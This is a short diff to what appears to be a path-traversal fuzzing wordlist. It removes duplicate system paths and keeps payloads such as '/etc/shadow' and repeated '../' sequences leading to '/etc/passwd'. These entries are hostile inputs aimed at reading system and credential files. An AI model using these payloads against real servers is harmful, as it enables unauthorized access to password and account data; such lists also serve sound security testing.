@@ -1,14 +1,5 @@
 /etc/passwd
 /etc/shadow
-/etc/aliases
-/etc/anacrontab
-/etc/apache2/apache2.conf
-/etc/passwd
-/etc/shadow
-/etc/aliases
-/etc/anacrontab
-/etc/apache2/apache2.conf
-/proc/2116/fd/11
 ..//etc/passwd
 ../..//etc/passwd
 ../../..//etc/passwd
@@ -17,3 +8,4 @@
 ../../../../../..//etc/passwd
 ../../../../../../..//etc/passwd
 ../../../../../../../..//etc/passwd
+
